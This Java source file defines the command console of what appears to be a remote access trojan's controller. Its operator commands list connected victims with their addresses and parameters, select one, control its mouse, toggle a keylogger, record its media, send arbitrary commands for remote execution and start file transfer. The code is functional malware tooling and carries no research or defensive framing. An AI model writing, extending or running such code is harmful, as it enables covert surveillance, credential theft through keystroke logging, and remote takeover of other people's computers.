package org.graviton.cmd;

import javafx.application.Platform;
import org.graviton.network.Client;
import org.graviton.network.Server;
import org.graviton.network.media.MediaServer;

import java.util.Collection;
import java.util.Scanner;

public class Shell {

    public static void start() {
        new Thread(() -> {
            Scanner scanner = new Scanner(System.in);
            while (scanner.hasNext()) {
                parse(scanner.nextLine());
            }
        }).start();
    }

    private static void parse(String input) {
        String command = input.split(" ")[0], extra = input.substring(command.length()).trim();

        switch (command.toLowerCase()) {
            case "send":
                Server.getInstance().send(extra);
                break;
            case "clients":
                listClients();
                break;
            case "select":
                Server.getInstance().selectClient(extra);
                break;
            case "mouse":
                Server.getInstance().switchMouseState(extra.toLowerCase());
                break;
            case "keylogger":
                Server.getInstance().switchKeyLogger();
                break;
            case "record":
                Platform.runLater(() -> MediaServer.getInstance().init(Server.getInstance().getSelectedClient()));
                break;
            case "execute" :
                Server.getInstance().send("x" + extra);
                break;
            case "ftp":
                Server.getInstance().send("f");
                break;

            default:
                System.err.println("Cannot find command [" + command + "]");
        }
    }

    private static void listClients() {
        Collection<Client> clients = Server.clients();

        if (clients.isEmpty()) {
            System.err.println("No client found");
        } else {
            clients.forEach(client -> {
                System.out.println("    - Client[" + client.getSession().getId() + "] : " + client.address());
                client.params().forEach((param, value) -> System.out.println("        " + param + ":" + value));
            });
        }
    }


}
